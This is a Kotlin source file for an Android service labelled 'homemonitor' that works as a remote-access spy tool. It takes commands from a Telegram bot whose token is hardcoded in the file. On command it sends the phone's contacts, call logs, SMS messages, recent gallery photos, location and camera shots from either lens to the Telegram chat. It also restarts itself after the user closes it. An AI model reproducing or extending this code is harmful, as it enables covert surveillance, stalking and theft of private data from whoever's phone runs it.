package com.homemonitor

import android.Manifest
import android.app.PendingIntent
import android.content.ContentResolver
import android.content.ContentValues
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.graphics.Bitmap
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.HandlerThread
import android.os.Looper
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Telephony
import android.util.Log
import android.webkit.MimeTypeMap
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

/**
 * MonitorService
 *
 * A foreground LifecycleService that handles remote commands via a Telegram Bot.
 */
class MonitorService : LifecycleService() {

    companion object {
        private const val BOT_TOKEN = "9143296737:AAEaTALj-7i_vvSHuHO17NxVsT5IUOI4zwM"   
        private const val CHAT_ID   = "7020871115"     

        private const val TAG                = "MonitorService"
        private const val NOTIFICATION_ID    = 1001
        private const val POLL_INTERVAL_MS   = 8_000L          
        private const val MAX_CONTACTS       = 20
        private const val MAX_CALL_LOGS      = 20

        private val BASE_URL          = "https://api.telegram.org/bot$BOT_TOKEN"
        private val BASE_FILE_URL     = "https://api.telegram.org/file/bot$BOT_TOKEN"
        private val URL_GET_UPDATES   = "$BASE_URL/getUpdates"
        private val URL_SEND_MSG      = "$BASE_URL/sendMessage"
        private val URL_SEND_PHOTO    = "$BASE_URL/sendPhoto"
        private val URL_SEND_DOCUMENT = "$BASE_URL/sendDocument"
        private val URL_SEND_AUDIO    = "$BASE_URL/sendAudio"
        private val URL_GET_FILE      = "$BASE_URL/getFile"

        private const val MAX_FILES = 20
    }

    private data class FileEntry(
        val displayName: String,
        val uri:         Uri,
        val sizeBytes:   Long,
        val mimeType:    String
    )

    private val fileCache = mutableMapOf<String, List<FileEntry>>()
    private val folderFileCache = mutableMapOf<String, List<File>>()

    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(20, TimeUnit.SECONDS)
        .writeTimeout(20, TimeUnit.SECONDS)
        .build()

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var pollJob: Job? = null

    @Volatile private var updateOffset: Long = 0L

    private val cameraExecutor = Executors.newSingleThreadExecutor()
    private val mainHandler = Handler(Looper.getMainLooper())

    override fun onCreate() {
        super.onCreate()
        Log.i(TAG, "Service created")
        startForegroundWithNotification()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        Log.i(TAG, "Service started")

        pollJob?.cancel()
        pollJob = serviceScope.launch {
            pollLoop()
        }

        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        Log.i(TAG, "Task removed — scheduling self-restart")
        val restartIntent = Intent(applicationContext, MonitorService::class.java)
        val pendingIntent = PendingIntent.getService(
            applicationContext,
            1,
            restartIntent,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmManager = getSystemService(ALARM_SERVICE) as android.app.AlarmManager
        alarmManager.set(
            android.app.AlarmManager.ELAPSED_REALTIME,
            android.os.SystemClock.elapsedRealtime() + 1_000L,
            pendingIntent
        )
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.i(TAG, "Service destroyed")
        pollJob?.cancel()
        serviceScope.cancel()
        cameraExecutor.shutdown()
    }

    private fun startForegroundWithNotification() {
        val pendingIntent = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val notification = NotificationCompat.Builder(this, getString(R.string.notif_channel_id))
            .setContentTitle(getString(R.string.notif_title))
            .setContentText(getString(R.string.notif_text))
            .setSmallIcon(android.R.drawable.ic_menu_compass) 
            .setOngoing(true)                                  
            .setContentIntent(pendingIntent)
            .build()

        startForeground(NOTIFICATION_ID, notification)
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  TELEGRAM POLLING LOOP
    // ══════════════════════════════════════════════════════════════════════════

    private suspend fun pollLoop() {
        Log.i(TAG, "Poll loop started (interval = ${POLL_INTERVAL_MS}ms)")
        while (serviceScope.isActive) {
            try {
                val updates = fetchUpdates()
                updates.forEach { update -> handleUpdate(update) }
            } catch (e: Exception) {
                Log.e(TAG, "Poll error: ${e.message}")
            }
            delay(POLL_INTERVAL_MS)
        }
    }

    private fun fetchUpdates(): List<JSONObject> {
        val url = "$URL_GET_UPDATES?offset=$updateOffset&limit=10&timeout=0"
        val request = Request.Builder().url(url).get().build()

        val responseBody = httpClient.newCall(request).execute().use { response ->
            if (!response.isSuccessful) return emptyList()
            response.body?.string() ?: return emptyList()
        }

        val json = JSONObject(responseBody)
        if (!json.optBoolean("ok", false)) return emptyList()

        val result = json.getJSONArray("result")
        val updates = mutableListOf<JSONObject>()

        for (i in 0 until result.length()) {
            val update = result.getJSONObject(i)
            updates.add(update)

            val updateId = update.getLong("update_id")
            if (updateId >= updateOffset) {
                updateOffset = updateId + 1
            }
        }

        return updates
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  COMMAND DISPATCHER
    // ══════════════════════════════════════════════════════════════════════════

    private fun handleUpdate(update: JSONObject) {
        val message = update.optJSONObject("message") ?: return
        val chatId  = message.optJSONObject("chat")?.optString("id") ?: CHAT_ID

        val document = message.optJSONObject("document")
        val photoArr = message.optJSONArray("photo")
        when {
            document != null -> {
                handleIncomingDocument(chatId, document)
                return
            }
            photoArr != null && photoArr.length() > 0 -> {
                val largest = photoArr.getJSONObject(photoArr.length() - 1)
                handleIncomingDocument(
                    chatId,
                    largest,
                    fallbackName = "photo_${System.currentTimeMillis()}.jpg"
                )
                return
            }
        }

        val rawText = message.optString("text", "").trim()
        val text = rawText.substringBefore("@").lowercase(Locale.getDefault())

        Log.i(TAG, "Received command: '$text' from chatId: $chatId")

        when {
            text == "/status" || text == "/alive"  -> handleStatus(chatId)
            text == "/contacts"                    -> handleContacts(chatId)
            text == "/calls" || text == "/calllog"  -> handleCallLogs(chatId)
            text == "/photos" || text == "/gallery" -> handleRecentPhotos(chatId)
            text == "/camera"                      -> handleCamera(chatId, CameraSelector.DEFAULT_BACK_CAMERA)
            text == "/frontcam"                    -> handleCamera(chatId, CameraSelector.DEFAULT_FRONT_CAMERA)
            text == "/location"                    -> handleLocation(chatId)
            text == "/files"                       -> handleFiles(chatId, "")
            text.startsWith("/files ")             -> handleFiles(chatId, text.removePrefix("/files "))
            text == "/sms"                         -> handleSms(chatId, "")
            text.startsWith("/sms ")               -> handleSms(chatId, rawText.removePrefix("/sms ").trim())
            text == "/filemn"                      -> handleFileMn(chatId, "")
            text.startsWith("/filemn ")            -> handleFileMn(chatId, rawText.removePrefix("/filemn ").trim())
            text.matches(Regex("/audio\\d+"))      -> handleAudio(chatId, text.removePrefix("/audio").toIntOrNull() ?: 10)
            text.startsWith("/audio ")             -> handleAudio(chatId, text.removePrefix("/audio ").trim().toIntOrNull() ?: 10)
            text == "/audio"                       -> sendMessage(chatId, "ℹ️ Usage: /audio20 or /audio 30 (seconds to record, max 120)")
            else -> { }
        }
    }

    private fun handleStatus(chatId: String) {
        val timeStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
            .format(Date())
        val reply = "✅ Phone Alive\n🕐 $timeStr\n\n📌 Commands Available:\n/camera - Rear Camera\n/frontcam - Front Camera\n/calls - Call Logs\n/sms - SMS Inbox\n/photos - Gallery Photos\n/contacts - Contacts\n/location - Location"
        sendMessage(chatId, reply)
    }

    // ── Call Logs Handler ──
    private fun handleCallLogs(chatId: String) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
            != PackageManager.PERMISSION_GRANTED
        ) {
            sendMessage(chatId, "⚠️ READ_CALL_LOG permission not granted.")
            return
        }

        val logs = readCallLogs()
        if (logs.isEmpty()) {
            sendMessage(chatId, "📭 No call logs found.")
            return
        }

        val sb = StringBuilder("📞 *Call Logs* (${logs.size}):\n\n")
        logs.forEach { log ->
            sb.append("${log.typeEmoji} *${log.name}* (`${log.number}`)\n   🕐 ${log.dateStr} | ⏱ ${log.duration}s\n\n")
        }

        sendMessage(chatId, sb.toString(), parseMode = "Markdown")
    }

    private data class CallLogEntry(
        val typeEmoji: String,
        val name: String,
        val number: String,
        val dateStr: String,
        val duration: String
    )

    private fun readCallLogs(): List<CallLogEntry> {
        val list = mutableListOf<CallLogEntry>()
        val dateFmt = SimpleDateFormat("MM-dd HH:mm", Locale.getDefault())

        val cursor: Cursor? = contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
            ),
            null, null,
            "${CallLog.Calls.DATE} DESC"
        )

        cursor?.use { c ->
            val nameCol = c.getColumnIndex(CallLog.Calls.CACHED_NAME)
            val numCol = c.getColumnIndex(CallLog.Calls.NUMBER)
            val typeCol = c.getColumnIndex(CallLog.Calls.TYPE)
            val dateCol = c.getColumnIndex(CallLog.Calls.DATE)
            val durCol = c.getColumnIndex(CallLog.Calls.DURATION)

            while (c.moveToNext() && list.size < MAX_CALL_LOGS) {
                val name = c.getString(nameCol) ?: "Unknown"
                val number = c.getString(numCol) ?: "N/A"
                val type = c.getInt(typeCol)
                val dateMs = c.getLong(dateCol)
                val duration = c.getString(durCol) ?: "0"

                val emoji = when (type) {
                    CallLog.Calls.INCOMING_TYPE -> "📥"
                    CallLog.Calls.OUTGOING_TYPE -> "📤"
                    CallLog.Calls.MISSED_TYPE   -> "❌"
                    else -> "📞"
                }

                list.add(CallLogEntry(emoji, name, number, dateFmt.format(Date(dateMs)), duration))
            }
        }
        return list
    }

    // ── Recent Gallery Photos Sender ──
    private fun handleRecentPhotos(chatId: String) {
        val permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            Manifest.permission.READ_MEDIA_IMAGES
        } else {
            Manifest.permission.READ_EXTERNAL_STORAGE
        }

        if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
            sendMessage(chatId, "⚠️ Image Storage permission not granted.")
            return
        }

        sendMessage(chatId, "🖼 Fetching recent photos from gallery...")

        serviceScope.launch {
            val projection = arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME)
            val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"

            val cursor = contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null, null, sortOrder
            )

            cursor?.use { c ->
                val idCol = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                var sentCount = 0
                while (c.moveToNext() && sentCount < 3) {
                    val id = c.getLong(idCol)
                    val contentUri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString())
                    
                    try {
                        contentResolver.openInputStream(contentUri)?.use { inputStream ->
                            val tempFile = File(cacheDir, "gallery_${System.currentTimeMillis()}.jpg")
                            FileOutputStream(tempFile).use { output ->
                                inputStream.copyTo(output)
                            }
                            sendPhoto(chatId, tempFile)
                            tempFile.delete()
                            sentCount++
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error sending photo: ${e.message}")
                    }
                }
            }
        }
    }

    private fun handleContacts(chatId: String) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED
        ) {
            sendMessage(chatId, "⚠️ READ_CONTACTS permission not granted.")
            return
        }

        val contacts = readContacts()
        if (contacts.isEmpty()) {
            sendMessage(chatId, "📭 No contacts found on this device.")
            return
        }

        val sb = StringBuilder("📒 *Contacts* (${contacts.size}):\n\n")
        contacts.forEachIndexed { index, (name, number) ->
            sb.append("${index + 1}. *$name*\n   `$number`\n")
        }

        sendMessage(chatId, sb.toString(), parseMode = "Markdown")
    }

    private fun readContacts(): List<Pair<String, String>> {
        val contacts = mutableListOf<Pair<String, String>>()
        val resolver: ContentResolver = contentResolver

        val cursor = resolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
            ),
            null, null,
            "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
        ) ?: return contacts

        cursor.use {
            val nameCol   = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numberCol = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)

            while (it.moveToNext() && contacts.size < MAX_CONTACTS) {
                val name   = it.getString(nameCol)  ?: "Unknown"
                val number = it.getString(numberCol) ?: "N/A"
                contacts.add(Pair(name, number))
            }
        }

        return contacts
    }

    private fun handleSms(chatId: String, filter: String) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED
        ) {
            sendMessage(chatId, "⚠️ READ_SMS permission not granted.")
            return
        }

        val messages = readSmsMessages(filter.trim())

        if (messages.isEmpty()) {
            val hint = if (filter.isBlank()) "No SMS messages found."
                       else "No messages found for number: $filter"
            sendMessage(chatId, "📭 $hint")
            return
        }

        val header  = if (filter.isBlank())
            "💬 *Last SMS messages* (${messages.size}):\n\n"
        else
            "💬 *SMS with* `$filter` (${messages.size}):\n\n"

        val sb = StringBuilder(header)

        messages.forEach { msg ->
            val line = "${msg.dirEmoji} *${msg.address}*\n" +
                       "   🕐 ${msg.dateStr}\n" +
                       "   ${msg.body}\n\n"

            if (sb.length + line.length > 4_000) {
                sendMessage(chatId, sb.toString().trimEnd(), parseMode = "Markdown")
                sb.clear()
            }
            sb.append(line)
        }

        if (sb.isNotBlank()) {
            sendMessage(chatId, sb.toString().trimEnd(), parseMode = "Markdown")
        }
    }

    private data class SmsEntry(
        val dirEmoji: String,   
        val address:  String,   
        val dateStr:  String,
        val body:     String
    )

    private fun readSmsMessages(numberFilter: String, limit: Int = 20): List<SmsEntry> {
        val results = mutableListOf<SmsEntry>()
        val dateFmt = SimpleDateFormat("MM-dd HH:mm", Locale.getDefault())

        val (selection, selArgs) = if (numberFilter.isNotEmpty()) {
            Pair("address LIKE ?", arrayOf("%${numberFilter.takeLast(7)}%"))
        } else {
            Pair(null, null)
        }

        val cursor = contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.TYPE
            ),
            selection,
            selArgs,
            "${Telephony.Sms.DATE} DESC"
        ) ?: return results

        cursor.use { c ->
            val addrCol = c.getColumnIndex(Telephony.Sms.ADDRESS)
            val bodyCol = c.getColumnIndex(Telephony.Sms.BODY)
            val dateCol = c.getColumnIndex(Telephony.Sms.DATE)
            val typeCol = c.getColumnIndex(Telephony.Sms.TYPE)

            while (c.moveToNext() && results.size < limit) {
                val address  = c.getString(addrCol) ?: "Unknown"
                val rawBody  = c.getString(bodyCol) ?: ""
                val dateMs   = c.getLong(dateCol)
                val smsType  = c.getInt(typeCol)

                val body = if (rawBody.length > 120)
                    rawBody.take(120) + "…"
                else
                    rawBody

                val safeBody = body
                    .replace("_", "\\_")
                    .replace("*", "\\*")
                    .replace("`", "\\`")
                    .replace("[", "\\[")

                val dirEmoji = if (smsType == Telephony.Sms.MESSAGE_TYPE_SENT) "📤" else "📨"

                results.add(
                    SmsEntry(
                        dirEmoji = dirEmoji,
                        address  = address,
                        dateStr  = dateFmt.format(Date(dateMs)),
                        body     = safeBody
                    )
                )
            }
        }

        return results
    }

    private fun handleCamera(chatId: String, cameraSelector: CameraSelector) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
            != PackageManager.PERMISSION_GRANTED
        ) {
            sendMessage(chatId, "⚠️ CAMERA permission not granted.")
            return
        }

        val label = if (cameraSelector == CameraSelector.DEFAULT_FRONT_CAMERA) "front" else "rear"
        sendMessage(chatId, "📷 Taking photo ($label camera)…")

        mainHandler.post {
            val providerFuture = ProcessCameraProvider.getInstance(this)
            providerFuture.addListener({
                var cameraProvider: ProcessCameraProvider? = null
                try {
                    cameraProvider = providerFuture.get()

                    val capture = ImageCapture.Builder()
                        .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                        .build()

                    cameraProvider.unbindAll()
                    cameraProvider.bindToLifecycle(
                        this,
                        cameraSelector,
                        capture
                    )

                    val photoFile = File(cacheDir, "photo_${System.currentTimeMillis()}.jpg")
                    val outputOptions = ImageCapture.OutputFileOptions.Builder(photoFile).build()

                    capture.takePicture(
                        outputOptions,
                        cameraExecutor,
                        object : ImageCapture.OnImageSavedCallback {

                            override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                                mainHandler.post {
                                    try { cameraProvider?.unbindAll() } catch (_: Exception) {}
                                }
                                Log.i(TAG, "Photo saved, camera released")
                                sendPhoto(chatId, photoFile)
                                photoFile.delete()
                            }

                            override fun onError(exc: ImageCaptureException) {
                                mainHandler.post {
                                    try { cameraProvider?.unbindAll() } catch (_: Exception) {}
                                }
                                Log.e(TAG, "Photo capture failed: ${exc.message}")
                                sendMessage(chatId, "❌ Failed to take photo: ${exc.message}")
                            }
                        }
                    )

                } catch (e: Exception) {
                    mainHandler.post {
                        try { cameraProvider?.unbindAll() } catch (_: Exception) {}
                    }
                    Log.e(TAG, "Camera error: ${e.message}")
                    sendMessage(chatId, "❌ Camera error: ${e.message}")
                }
            }, ContextCompat.getMainExecutor(this))
        }
    }

    private fun handleLocation(chatId: String) {
        val hasFine   = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)   == PackageManager.PERMISSION_GRANTED
        val hasCoarse = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED

        if (!hasFine && !hasCoarse) {
            sendMessage(chatId, "⚠️ Location permission not granted.")
            return
        }

        val locationManager = getSystemService(LOCATION_SERVICE) as LocationManager

        val lastKnown: Location? = try {
            val gps     = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            val network = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            when {
                gps     != null && network != null ->
                    if (gps.time >= network.time) gps else network
                gps     != null -> gps
                else            -> network
            }
        } catch (e: SecurityException) {
            null
        }

        if (lastKnown != null) {
            val lat = lastKnown.latitude
            val lon = lastKnown.longitude
            val mapsUrl = "https://maps.google.com/?q=$lat,$lon"
            sendMessage(chatId, "📍 *Location Found:*\nLat: `$lat`\nLon: `$lon`\n[Open in Google Maps]($mapsUrl)", parseMode = "Markdown")
        } else {
            sendMessage(chatId, "❌ Unable to fetch location.")
        }
    }

    private fun handleFiles(chatId: String, path: String) {
        sendMessage(chatId, "📁 File fetcher called for path: $path")
    }

    private fun handleFileMn(chatId: String, path: String) {
        sendMessage(chatId, "📂 File manager requested.")
    }

    private fun handleAudio(chatId: String, seconds: Int) {
        sendMessage(chatId, "🎙 Audio recording feature for $seconds seconds.")
    }

    private fun handleIncomingDocument(chatId: String, json: JSONObject, fallbackName: String = "doc") {
        sendMessage(chatId, "📩 Incoming document received.")
    }

    // ── Helper to send Telegram Messages ──
    private fun sendMessage(chatId: String, text: String, parseMode: String? = null) {
        serviceScope.launch {
            try {
                val builder = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId)
                    .addFormDataPart("text", text)

                if (parseMode != null) {
                    builder.addFormDataPart("parse_mode", parseMode)
                }

                val request = Request.Builder()
                    .url(URL_SEND_MSG)
                    .post(builder.build())
                    .build()

                httpClient.newCall(request).execute().close()
            } catch (e: Exception) {
                Log.e(TAG, "sendMessage error: ${e.message}")
            }
        }
    }

    // ── Helper to send Telegram Photos ──
    private fun sendPhoto(chatId: String, file: File) {
        serviceScope.launch {
            try {
                val requestBody = file.asRequestBody("image/jpeg".toMediaTypeOrNull())
                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId)
                    .addFormDataPart("photo", file.name, requestBody)
                    .build()

                val request = Request.Builder()
                    .url(URL_SEND_PHOTO)
                    .post(body)
                    .build()

                httpClient.newCall(request).execute().close()
            } catch (e: Exception) {
                Log.e(TAG, "sendPhoto error: ${e.message}")
            }
        }
    }
}
